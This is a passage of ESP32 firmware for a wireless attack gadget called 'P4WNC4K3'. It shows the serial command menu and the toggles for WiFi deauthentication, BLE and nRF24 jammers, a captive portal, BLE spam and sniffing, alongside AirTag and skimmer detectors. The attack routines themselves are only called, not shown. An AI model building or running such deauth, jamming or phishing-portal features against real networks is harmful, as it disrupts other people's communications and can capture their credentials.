    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    String truncSSID = wardrivingStats.strongestSSID;
    if (truncSSID.length() > 28) {
      truncSSID = truncSSID.substring(0, 27) + "~";
    }
    tft.println(truncSSID);
    
    y += 15;
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.printf("RSSI: %d dBm", wardrivingStats.strongestRSSI);
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== Serial Commands ====================

void handleSerialCommands() {
  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();
    cmd.toLowerCase();
    
    Serial.println("CMD: " + cmd);
    
    if (cmd == "help") {
      Serial.println("\n=== P4WNC4K3 Console ===");
      Serial.println("scan - Scan WiFi networks");
      Serial.println("deauth - Toggle deauth attack");
      Serial.println("deauthsniff - Toggle deauth sniffer");
      Serial.println("sniffer - Toggle packet sniffer");
      Serial.println("ble - Scan BLE devices");
      Serial.println("blejam - Toggle BLE jammer");
      Serial.println("nrfjam - Toggle nRF24 jammer");
      Serial.println("airtag - Scan for AirTags");
      Serial.println("skimmer - Detect card skimmers");
      Serial.println("portal - Toggle captive portal");
      Serial.println("spam - BLE spam attacks");
      Serial.println("wardrive - Wardriving mode");
      Serial.println("status - Show system status");
      Serial.println("console - Show console on screen");
      Serial.println("clear - Clear console buffer");
      Serial.println("info - System information");
    }
    else if (cmd == "scan") {
      scanWiFiNetworks();
    }
    else if (cmd == "deauth") {
      toggleDeauth();
    }
    else if (cmd == "sniffer") {
      toggleSniffer();
    }
    else if (cmd == "ble") {
      scanBLEDevices();
    }
    else if (cmd == "blejam") {
      toggleBLEJammer();
    }
    else if (cmd == "nrfjam") {
      toggleNRFJammer();
    }
    else if (cmd == "deauthsniff") {
      if (!deauthSnifferActive) {
        currentState = DEAUTH_SNIFFER;
        startDeauthSniffer();
      } else {
        stopDeauthSniffer();
      }
    }
    else if (cmd == "airtag") {
      startAirTagScanner();
    }
    else if (cmd == "skimmer") {
      startSkimmerDetector();
    }
    else if (cmd == "portal") {
      toggleCaptivePortal();
    }
    else if (cmd == "wardrive") {
      startWardriving();
    }
    else if (cmd == "status") {
      printStatus();
    }
    else if (cmd == "console") {
      showConsole();
    }
    else if (cmd == "clear") {
      clearConsole();
    }
    else if (cmd == "skull") {
      showSkull = !showSkull;
      Serial.println(showSkull ? "Skull animation ON" : "Skull animation OFF");
    }
    else if (cmd == "info") {
      printSystemInfo();
    }
    else {
      Serial.println("Unknown command. Type 'help' for commands.");
    }
  }
}

void toggleDeauth() {
  if (!deauthActive) {
    if (networkCount > 0) {
      startDeauth();
      Serial.println("Deauth started");
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopDeauth();
    Serial.println("Deauth stopped");
  }
}

void toggleSniffer() {
  if (!snifferActive) {
    snifferScrollOffset = 0;
    packetHistoryIndex = 0;
    startSniffer();
  } else {
    stopSniffer();
    currentState = MAIN_MENU;
    drawMainMenu();
  }
}

void toggleCaptivePortal() {
  if (snifferActive) stopSniffer();
  if (deauthActive) stopDeauth();
  
  WiFi.disconnect();
  delay(100);
  WiFi.mode(WIFI_AP);
  if (!portalActive) {
    if (networkCount > 0) {
      startCaptivePortal();
    } else {
      Serial.println("Scan networks first");
    }
  } else {
    stopCaptivePortal();
  }
}

void toggleBLEJammer() {
  if (!bleJammerActive) {
    startBLEJammer();
  } else {
    stopBLEJammer();
  }
}

void toggleNRFJammer() {
  if (!nrfJammerActive) {
    startNRFJammer();
  } else {
    stopNRFJammer();
  }
}

void printStatus() {
  Serial.println("\n=== System Status ===");
  Serial.printf("Deauth: %s (%d pkts)\n", deauthActive ? "ACTIVE" : "INACTIVE", deauthPacketsSent);
  Serial.printf("Sniffer: %s\n", snifferActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("BLE Jammer: %s (%d pkts)\n", bleJammerActive ? "ACTIVE" : "INACTIVE", bleJamPackets);
  Serial.printf("nRF24 Jammer: %s (%d pkts)\n", nrfJammerActive ? "ACTIVE" : "INACTIVE", nrfJamPackets);
  Serial.printf("Packets: Total=%d, Beacon=%d, Data=%d, Deauth=%d\n", 
                packetCount, beaconCount, dataCount, deauthCount);
  Serial.printf("Portal: %s\n", portalActive ? "ACTIVE" : "INACTIVE");
  Serial.printf("AirTags detected: %d\n", airTagCount);
  Serial.printf("Skimmers detected: %d\n", skimmerCount);
  Serial.printf("Free Heap: %d KB\n", ESP.getFreeHeap() / 1024);
}

void clearConsole() {
  for (int i = 0; i < 15; i++) {
    consoleBuffer[i] = "";
  }
  consoleIndex = 0;
  Serial.println("Console cleared");
}

void printSystemInfo() {
  Serial.println("\n=== System Info ===");
  Serial.printf("Chip: %s\n", ESP.getChipModel());
  Serial.printf("CPU: %d MHz\n", ESP.getCpuFreqMHz());
  Serial.printf("Flash: %d MB\n", ESP.getFlashChipSize() / 1048576);
  Serial.printf("MAC: %s\n", WiFi.macAddress().c_str());
  Serial.printf("SDK: %s\n", ESP.getSdkVersion());
  Serial.printf("nRF24 #1: %s\n", nrf1Available ? "Available" : "Not found");
  Serial.printf("nRF24 #2: %s\n", nrf2Available ? "Available" : "Not found");
}
